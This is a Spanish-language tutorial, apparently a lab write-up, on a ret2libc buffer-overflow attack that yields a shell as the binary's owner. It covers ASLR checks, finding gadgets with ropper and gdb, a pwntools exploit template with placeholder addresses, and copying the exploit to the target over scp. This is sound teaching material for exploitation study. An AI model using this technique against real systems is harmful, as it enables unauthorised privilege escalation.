Este ataque redirige el flujo del programa para ejecutar funciones en la librería C **libc**, como system. Le estamos diciendo al programa qué hacer y por consecuencia recibimos una shell como el usuario propietario del binario.

Pero antes de hacer eso necesitamos asegurarnos de qué tipo de **ASLR** (Address Space Layout Randomization) está usando esta máquina.

Existen 3 estados en ASLR que pueden ser configurados.

- 0 (Deshabilitado, sin aleatorización en la memoria)
- 1 (Aleatorización Parcial, Aleatoriza librerías compartidas, pila, etc...)
- 2 (Aleatorización Completa, todas las direcciones pueden ser completamente aleatorias)

Para verificar qué usa este sistema podemos verificarlo en la máquina objetivo en el archivo **randomize_va_space** esto nos muestra el número que está usando este sistema.

```bash
usuario@servidor:/opt$ cat /proc/sys/kernel/randomize_va_space 
```

Toca verificar si la librería pwntools esta instalada:

```bash
python3
>>> from pwn import *
>>>
```

Ahora localizo normal el offset junto con la dirección del gadget pop rdi con ropper en la maquina host:

```bash
ropper --file <BINARIO> --search "pop rdi"
```

Esta dirección se llena con un byte nulo y en el pop rdi se ingresa la dirección de la cadena sh:

Dentro de gdb localizar la dirección de la función system:

```bash
(gdb) b *main
```

Ejecutar binario y encontrar system :

```bash
(gdb) r
(gdb) p system
```

Esa es la dirección system. 

Ahora encontrar la cadena /bin/sh:

```bash
(gdb) find &system,+9999999,"/bin/sh"
```

Verificar:

```bash
(gdb) x/s <CADENA>
```

Ya con todo esto  (Offset, pop_rdi, sys_addr, sh addr) podemos crear el exploit en la máquina host. 

En este caso utilizare Python:

```bash
from pwn import *

def exploit():
    load = ELF("<RUTA_A_BINARIO>")
    prc = process("<RUTA_A_BINARIO>")

# Cambiar 

    offset = <NUMERO> 

    pop_rdi = p64(<NUMERO>)
    sys_addr = p64(<NUMERO>)
    sh_addr = p64(<NUMERO>)
    null = p64(0x0)

    payload = b"A"*offset + pop_rdi + sh_addr + null + sys_addr

    prc.sendafter(b"nombre: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Y lo envio si es que hay un servicio SSH activo:

```bash
scp exploit.py usuario@IP:/tmp
```

Dentro solo se ejecuta:

```bash
/tmp$ python3 exploit.py 
```

Listo.
